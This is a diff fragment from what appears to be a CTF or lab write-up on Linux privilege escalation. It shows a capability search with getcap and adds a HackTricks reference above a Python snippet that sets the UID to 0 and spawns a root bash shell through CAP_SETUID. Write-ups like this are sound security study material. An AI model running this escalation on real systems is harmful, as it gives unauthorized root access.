@@ -136,11 +136,14 @@ getcap -r / 2>/dev/null
 handlers.py 
 ```
 
+[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_setuid)
 ```python
 import os
 os.setuid(0)
 os.system("/bin/bash")
 ```
+
+
 
 root.png
 
